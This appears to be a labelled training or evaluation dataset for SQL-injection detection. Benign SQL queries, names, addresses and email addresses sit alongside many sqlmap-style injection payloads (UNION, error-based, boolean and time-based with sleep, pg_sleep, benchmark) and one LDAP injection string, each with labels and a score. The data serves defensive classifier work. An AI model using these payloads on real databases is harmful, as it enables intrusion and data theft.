"select t.*, tt.*, tr.object_id from wp_terms as t inner join wp_term_taxonomy as tt on t.term_id  =  tt.term_id inner join wp_term_relationships as tr on tr.term_taxonomy_id  =  tt.term_taxonomy_id where tt.taxonomy in  ( 'support_cat' )  and tr.object_id in  ( 347681, 262330, 292419, 262334 )  order by t.name asc",0,0,0.05
select * from brush fetch first 50 percent rows only,0,0,0.0
select avg ( price ) from consist,0,0,0.0
from  ( select distinct roll from independent ) ,0,0,0.0
select * from  ( select machine from combine ) ,0,0,0.0
select * from bus where question not like '[having]%',0,0,0.0
select count ( distinct community )  from journey,0,0,0.0
-6233'  )   where 9820  =  9820 or 3038  =  3038,1,1,1.0
"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dwpa""  =  ""dwpa",1,1,1.0
select option_value from wp_options where option_name  =  '_transient_timeout_wp_stateless_google_sdk_conflict' limit 1,0,0,0.0
select flew ( s )  from only union,0,0,0.0
select * from rate where same between 'two' and 'congress',0,0,0.0
"c/ amador de los rios, 131, 1?g",0,0,0.04
"  select * from glass where life in  ( 'fall', 'slip', 'heat' )  ",0,0,0.0
" select * from users where id  =  1 union select @&&@,version  (    )   -- 1",1,1,0.99
select avg ( lion ) from this,0,0,0.0
select * from sudden  where industrial = bigger,0,0,0.0
"  select orders.expectrid, employees.about, employees.zipper from ordersright join employees on orders.employeeid  =  employees.determineid order by orders.unitid",0,0,0.0
"1""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""ajuh""  =  ""ajuh",1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 262335 )  order by meta_id asc",0,0,0.0
-5356'  )   or 9323  =  9323#,1,1,1.0
1  )   where 4780  =  4780,1,1,1.0
"1'||  (  select 'ltqo' where 9080  =  9080 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1,1,1.0
select * from vowel where test between 'additional' and 'won',0,0,0.0
8110,0,0,0.004468253314358248
" select * from military order by lower, courage",0,0,0.0
1'  )   as llug where 2244  =  2244 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,0.99
4ntra6a,0,0,0.004468253314358248
"1'||  (  select 'djoe' from dual where 8063  =  8063   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   ||'",1,1,1.0
select case when 1802  =  7063 then 1 else null end--,1,1,1.0
pettinge,0,0,0.004468253314358248
select top 3 * from stage,0,0,0.0
select * from machinery,0,0,0.0
1'+  (  select 'mxlb' where 4900  =  4900,1,1,1.0
select avg ( population ) from thread select sum ( at ) ,0,0,0.0
leandro,0,0,0.004468253314358248
1'+  (  select ntym where 4750  =  4750,1,1,1.0
moskuna@sitcpla.ye,0,0,0.004468253314358248
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'qbdm'  =  'qbdm",1,1,1.0
select * from tail where herd = 'sun'  and  ( film = 'entirely' or become = 'sport' ) ,0,0,0.0
oskorep,0,0,0.004468253314358248
aimarsen@enla.gi,0,0,0.004468253314358248
32,0,0,0.004468253314358248
"1' where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,1,1.0
select belt,0,0,0.03250505488953901
"1'+  (  select 'cstd' where 9326  =  9326 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  +'",1,1,1.0
torrecilla lafuente,0,0,0.004468253314358248
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@version -- 1'",1,1,0.99
guindo vive,0,0,0.004468253314358248
duchement tenza,0,0,0.004468253314358248
6i4t562e7a,0,0,0.004468253314358248
"1""  )   as hfgk where 1100  =  1100 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
select count ( whale )  from chamber,0,0,0.0
bu7c2pi,0,0,0.004468253314358248
burgs campa,0,0,0.004468253314358248
select any ( s )  from close union all,0,0,0.0
select team from pack,0,0,0.0
1'+  (  select hvsb where 3666  =  3666,1,1,1.0
-4713'   )    )     )   or 4567  =  1287,1,1,1.0
select count ( top ) from model,0,0,0.0
select * from bat fetch first 50 percent rows onlyselect top 3 * from telephone,0,0,0.0
select * from hidden fetch first 3 rows only select top 50 percent * from fifth,0,0,0.0
"1"" where 6501  =  6501",1,1,1.0
select top 50 percent * from area select * from wise fetch first 50 percent rows onlyselect top 3 * from throat,0,0,0.0
select count ( distinct quietly )  from college,0,0,0.0
select top 50 percent * from ear select * from fog fetch first 50 percent rows onlyselect top 3 * from tribe,0,0,0.0
select top 3 * from constantly select * from outer 3select * from consider,0,0,0.0
select wp_posts.* from wp_posts where 1 = 1 and wp_posts.post_parent  =  367564 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish' or wp_posts.post_status  =  'trash'  )  )   order by wp_posts.menu_order asc,0,0,0.08
from  ( select distinct low from wish ) ,0,0,0.0
" select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",1,1,1.0
"-9003""   )    )    union all select 9721,9721--",1,1,1.0
select * from cream 3 select * from cloth,0,0,0.0
stadler_munks@chevrolet-volt.at,0,0,0.010209845608260035
select   (  case when   (  2593  =  3592  )   then 2593 else 2593*  (  select 2593 from information_schema.character_sets  )   end  )  #,1,1,1.0
"1'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'yiem'  =  'yiem",1,1,1.0
saturin-fabre0@cienciapolicial.int,0,0,0.09024765303088228
select * from belong where tight = 'bow' fetch first 3 rows only,0,0,0.0
"1'||  (  select 'vixv' from dual where 7704  =  7704 union all select null,null,null,null,null--",1,1,1.0
select top 50 percent * from oxygen,0,0,0.0
47965007w,0,0,0.004468253314358248
"  select * from rather where anything in  ( 'doctor', 'examine', 'well' )  ",0,0,0.0
"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",1,1,1.0
79564193v,0,0,0.004468253314358248
elois,0,0,0.004468253314358248
dans,0,0,0.004468253314358248
select * from share where curious between 'better' and 'office',0,0,0.0
select * from spin where fence not like '[master]%',0,0,0.0
mohar@ropadegolf.gg,0,0,0.004468253314358248
select * from chamber where brave  between 10 and 20,0,0,0.0
"-1917""  )   or 8571  =  8571--",1,1,1.0
"  select * from body where told in  ( 'moving', 'rest', 'since' )  ",0,0,0.0
select fort ( s )  from main left join,0,0,0.0
levert,0,0,0.004468253314358248
select * from balance where return = 'atomic'  or neck = 'plant',0,0,0.0
select * from arrangement where return between certain09/01/1996four and chart15/31/1996party,0,0,0.0
select * from rain fetch first 50 percent rows only,0,0,0.0
"1%""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
select * from farm where grass = 'material' fetch first 3 rows only,0,0,0.0
select fox from first union select breakfast from mouse order by silk,0,0,0.0
select * from cool where ready = 'eye'  or regular = 'alive',0,0,0.0
"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1,1,1.0
"  select except,he,extra from child left join orders on market.classid =  palace.dead order by course.leader",0,0,0.0
or ''  =  ',1,1,1.0
afijacin,0,0,0.004468253314358248
"1%""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,1.0
perene,0,0,0.004468253314358248
5164,0,0,0.004468253314358248
hennon,0,0,0.004468253314358248
 (  select   (  case when   (  6838  =  2866  )   then 6838 else 1/  (  select 0  )   end   )    ) ,1,1,1.0
select torn ( s )  from pile union,0,0,0.0
"1' in boolean mode  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,1.0
"1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,1,1.0
"  select announced,noon from beginning where brown = 'cave' union select foot, quiet from rabbit",0,0,0.0
"1   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,1.0
"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",1,1,1.0
"insert into motor ( gasoline, something, single, because, below, announced )  values  ( 'gather', 'produce'. fight', 'chart', 'plate', 'meat', 'nose' )  ",0,0,0.0
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",1,1,1.0
select * from machine  where death not like '[tool]%',0,0,0.0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1,1,1.0
select * from write where silk = 'remain'  and city = 'wait',0,0,0.0
select correctly ( s ) from wave inner join,0,0,0.0
select top 3 * from wild where laid = 'same' select * from provide,0,0,0.0
select curtime (  )  + 1;,0,0,0.0
muro de aguas,0,0,0.0
select * from feed where date between direction09/01/1996breathe and grain15/31/1996jar,0,0,0.0
select dayofyear ( curdate (   )  )  ;,0,0,0.0
select * from dozen where verb not like 'clothing%',0,0,0.0
1'||  (  select 'yezk' where 2097  =  2097,1,1,1.0
select * from scared where scared like '%our%',0,0,0.0
roca,0,0,0.004468253314358248
1   )    )    and 9198  =  9198--,1,1,1.0
lorain-ligero@mareventsprotocolosocial.tn,0,0,0.006527024015406931
" select column_name ( s )  from serve,fill",0,0,0.0
select wind ( s )  from charge select correctly ( s ) ,0,0,0.0
select * from danger order by wealth,0,0,0.0
"   select employees.house, count ( orders.picturedid )  as nationalfrom    ( ordersinner join series on orders.deeplyid  =  employees.positionid ) ",0,0,0.0
select avg ( wrote )  from straw  select sum ( love ) ,0,0,0.0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""%""  =  """,1,1,1.0
-3899'  )   where 8152  =  8152 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,1,1.0
select told ( s )  from bring full outer join,0,0,0.0
"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'qdhz'  =  'qdhz",1,1,1.0
fernn caballero,0,0,0.004468253314358248
select * from wide fetch first 50 percent rows only,0,0,0.0
select include ( s )  from egg full outer join,0,0,0.0
coch soto,0,0,0.004468253314358248
69346006v,0,0,0.004468253314358248
c/ grabador david roberts 154 1-h,0,0,0.04
1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,1.0
select * from customers order by customername;,0,0,0.0
conmi5u52,0,0,0.004468253314358248
select count ( * )  as year,0,0,0.0
"  select   cast ( ""2017-08-29"" as date ) ;",0,0,0.04
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,1,1.0
1'+  (  select nsri where 1202  =  1202 and 4595  =  4595#,1,1,0.99
"  select wrong,arrangement,danger from chest left join orders on once.mysteriousid =  manufacturing.expression order by top.lake",0,0,0.0
bockaj,0,0,0.004468253314358248
39152269j,0,0,0.004468253314358248
2563,0,0,0.004468253314358248
"c/ juan luis peralta, 49 13-f",0,0,0.0
delete from bush where deal = 'inside',0,0,0.0
nonaspe,0,0,0.004468253314358248
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'pjrf'  =  'pjrf",1,1,1.0
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1,1,0.99
divinizacin,0,0,0.004468253314358248
"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",1,1,1.0
"1' in boolean mode  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
select * from production fetch first 50 percent rows only,0,0,0.0
"insert into balance  ( meant, gravity, daily )  values  ( 'let', 'soldier', 'chief' )  ",0,0,0.0
virge,0,0,0.004468253314358248
"1   )    )    as zmsa where 6909  =  6909 union all select null,null,null,null,null,null,null#",1,1,1.0
"-1630' union all select 1971,1971--",1,1,1.0
select * from two where library = 'keep'  or ants = 'closely',0,0,0.0
select avg ( perfectly ) from band,0,0,0.0
select * from power where thick = 'accept'  and city = 'native',0,0,0.0
"grupo fuensanta 197, 12?a",0,0,0.07318018131493495
select * from either fetch first 50 percent rows only,0,0,0.0
"insert into grade ( chapter, do, graph, exactly, steady, news )  values  ( 'motor', 'cannot'. regular', 'edge', 'burst', 'flag', 'never' )  ",0,0,0.0
select * from wore where weak = 'gas'  or additional = 'wherever',0,0,0.0
"1'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
select top 50 percent * from diameter select * from real fetch first 50 percent rows onlyselect top 3 * from ready,0,0,0.0
select * from interior where themselves = 'compare'  or verb = 'rain',0,0,0.0
select avg ( plus )  from dirt  select sum ( dropped ) ,0,0,0.0
thuswald,0,0,0.004468253314358248
select * from powder where not brown = 'not'  and not pond = 'soil',0,0,0.0
%2a%28%7c%28mail%3d%2a%29%29,1,1,0.9800939470890968
"-1168   )    )    as vlol where 3475  =  3475 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",1,1,1.0
"1""   )    )    as tsry where 6594  =  6594 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,1,1.0
"1'||  (  select 'bvic' from dual where 4839  =  4839 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",1,1,1.0
s!oap,0,1,0.99
sappington-espana@fighting-machines.mq,0,0,0.006527024015406931
"1%""   )    )    and 4595  =  4595#",1,1,1.0
1'   )    )    as wdor where 7426  =  7426,1,1,1.0
persaud,0,0,0.004468253314358248
"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'bfrq' like 'bfrq",1,1,1.0
select count ( married ) from tall,0,0,0.0
"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'qvyq' like 'qvyq",1,1,1.0
select * from same where    not simply = 'south',0,0,0.0
"select * from generate_series  (  9964,9964,case when   (  9964  =  4455  )   then 1 else 0 end  )   limit 1--",1,1,1.0
"calle doctor bove, 65",0,0,0.0
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""mbas""  =  ""mbas",1,1,1.0
select asin ( 0.25 ) ;,0,0,0.02
delete from satellites,0,0,0.0
select top 3 * from spin where below = 'form' select * from origin,0,0,0.0
oseja,0,0,0.004468253314358248
"   select suddenly, tropical, voyagefrom door where tales  is not null",0,0,0.0
mara beln,0,0,0.004468253314358248
select * from pain where stay between '1996-07-01' and '1996-07-31',0,0,0.0
or,1,1,0.6109987990942388
select avg ( though ) from making select sum ( cowboy ) ,0,0,0.0
96399738e,0,0,0.004468253314358248
gwillim.somerset@mystyleperfume.nl,0,0,0.004468253314358248
t!74ador,0,0,0.15375804839569454
select top 3 * from hill where there = 'torn',0,0,0.0
select * from six where not community = 'famous'  and not luck = 'engine',0,0,0.0
5.25502e+15,0,0,0.0
"plza. leire, 1, 6?a",0,0,0.1700595238095238
"   select count ( order ) , other from pipe by sometime",0,0,0.0
select avg ( price ) from sail,0,0,0.0
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,1,1,1.0
"1'||  (  select 'baur' from dual where 9384  =  9384 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
select * from proud 3,0,0,0.0
select * from higher order by make desc,0,0,0.0
1  )   waitfor delay '0:0:5' and   (  2993  =  2993,1,1,0.99
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'sqni' like 'sqni",1,1,1.0
leyton@intg.tk,0,0,0.004468253314358248
select * from cold where fireplace = 'bread',0,0,0.0
"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa",1,1,1.0
entrala,0,0,0.004468253314358248
beterette estruga,0,0,0.004468253314358248
arrestar,0,0,0.004468253314358248
"-4586 union all select 2068,2068,2068,2068--",1,1,1.0
"1 union all select null,null,null,null,null--",1,1,1.0
"-7142'   )    )    union all select 5083,5083,5083,5083#",1,1,1.0
kouraviev@socimi.com.gl,0,0,0.0
"calle plantio, 178,",0,0,0.0
6egas0a,0,0,0.004468253314358248
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  #",1,1,0.98
select unhappy from baby union select kill from cake order by arrow,0,0,0.0
paolo,0,0,0.004468253314358248
from  ( select distinct way from area ) ,0,0,0.0
select * from nothing where quick not like '[share]%',0,0,0.0
1' where 9242  =  9242,1,1,1.0
"-2605%'   )    )     )   union all select 4738,4738#",1,1,1.0
afoscarse,0,0,0.004468253314358248
select thou ( s from together right join,0,0,0.0
"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",1,1,1.0
"select extract ( year_month from ""2017-06-15 09:34:21"" ) ;",0,0,0.0
select * from spend where search between '1996-07-01' and '1996-07-31',0,0,0.0
3.37557e+15,0,0,0.0
select alike ( s )  from soil select vapor ( s ) ,0,0,0.0
"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr",1,1,1.0
"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",1,1,1.0
end and    (    (     (  'xzbk'  =  'xzbk,1,1,1.0
select count ( certain ) from factory,0,0,0.0
"  select maketime ( 11, 35,   4 ) ;",0,0,0.0
"  select orders.memoryrid, employees.slightly, employees.rain from ordersright join employees on orders.employeeid  =  employees.westernid order by orders.medicineid",0,0,0.0
1'+  (  select 'stdl' where 4581  =  4581,1,1,1.0
raixa s/n,0,0,0.0
select * from customers; delete from customers  where customername = 'alfreds futterkiste';,0,0,0.01
"omellons, els",0,0,0.004468253314358248
"   select count ( uncle ) , day from family by instant",0,0,0.0
"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",1,1,1.0
32893899n,0,0,0.004468253314358248
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1,1,1.0
29850288z,0,0,0.004468253314358248
"1"" or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
"  select * from bone where ever not in  ( 'planning', 'watch', 'label' )  ",0,0,0.0
1' where 6583  =  6583,1,1,1.0
"plaza de el salvador 91,",0,0,0.0
select * from users where userid  =  105; drop table suppliers;,0,0,0.17
select * from deal order by adventure,0,0,0.0
"1%'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   '%'  =  '",1,1,1.0
"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'pufu' like 'pufu",1,1,1.0
select * from exercise where raise = 'fact'  or start = 'slip',0,0,0.0
8.61689e+15,0,0,0.0
select min ( doubt )  as horn from work,0,0,0.0
"1' in boolean mode  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'gxgi'  =  'gxgi",1,1,1.0
 update riding set piano = 'perfectly'where peace = 'such',0,0,0.0
14724400f,0,0,0.004468253314358248
acrianzada,0,0,0.004468253314358248
select * from negative where poor = 'third' limit 3,0,0,0.0
"1""  )   where 8254  =  8254 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
"  select orders.fifteenrid, employees.attempt, employees.date from ordersright join employees on orders.employeeid  =  employees.forestid order by orders.anywayid",0,0,0.0
-9087 or 3038  =  3038,1,1,0.98
"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",1,1,1.0
select 10 div 5;,0,0,0.06
select * from wheel,0,0,0.0
select * from although 3 select * from frozen,0,0,0.0
select * from individual where    not post = 'horn',0,0,0.0
23,0,0,0.004468253314358248
1'||  (  select 'zeet' from dual where 9567  =  9567 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,0.98
-3677'   )    )    or 1939  =  4484,1,1,1.0
"   select zulu, wise, poor from poor where with  is null",0,0,0.0
1' and 1541  =  6868#,1,1,1.0
select fought ( s )  from planned,0,0,0.0
crabe,0,0,0.004468253314358248
37766,0,0,0.004468253314358248
1  )   as hggi where 6511  =  6511,1,1,1.0
"-1999  )   union all select 1779,1779,1779,1779,1779,1779,1779,1779,1779,1779#",1,1,1.0
"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,1,1.0
"1""   )    )    as bbkl where 5686  =  5686",1,1,1.0
select waste ( s )  from direct select putting ( s ) ,0,0,0.0
"   select swim, again, thrown from diameter where driver  is null",0,0,0.0
select * from citizen where explanation = 'office' limit 3,0,0,0.0
1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',1,1,0.99
"1""  )   as iwri where 4921  =  4921 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",1,1,1.0
"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",1,1,1.0
"1'+  (  select sfmz where 4870  =  4870 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
" select o.orderid, o.orderdate, c.customername from customers as c, orders as o where c.customername = 'around the horn' and c.customerid = o.customerid;",0,0,0.05
select wp_posts.* from wp_posts where id in  ( 367582 ) ,0,0,0.0
order by,1,0,0.16023803881204057
select * from captured where    not feathers = 'mountain',0,0,0.0
select * from slip where husband = 'free'  or alive = 'did',0,0,0.0
"1'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
"-2704""  )   union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",1,1,1.0
"1'  )   where 7322  =  7322 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
robin,0,0,0.004468253314358248
select * from slept,0,0,0.0
"1%"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,1,1.0
1   )    )    as xoch where 8765  =  8765 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,1,1.0
select count ( adultid ) from visitor,0,0,0.0
"1%'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  '%'  =  '",1,1,1.0
select * from came where green = 'quickly'  or matter = 'deal',0,0,0.0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'xaoi'  =  'xaoi",1,1,1.0
"-9178 where 2253  =  2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#",1,1,1.0
"-9111"" or 3038  =  3038",1,1,1.0
select * from final  where salmon not like '[ship]%',0,0,0.0
select top 3 * from support,0,0,0.0
azema.alvir@telogis.gf,0,0,0.004468253314358248
select count ( * )  as sugar,0,0,0.0
 -- &password  = ,1,1,0.97
28760,0,0,0.004468253314358248
"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",1,1,1.0
select cat from women,0,0,0.0
select avg ( courage ) from daughter,0,0,0.0
select top 50 percent * from college select * from memory fetch first 50 percent rows onlyselect top 3 * from rising,0,0,0.0
"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,1,1,1.0
select * from without where car = 'especially'  or tears = 'southern',0,0,0.0
"1""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""twpn"" like ""twpn",1,1,1.0
-2181'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'wyez'  =  'wyez,1,1,1.0
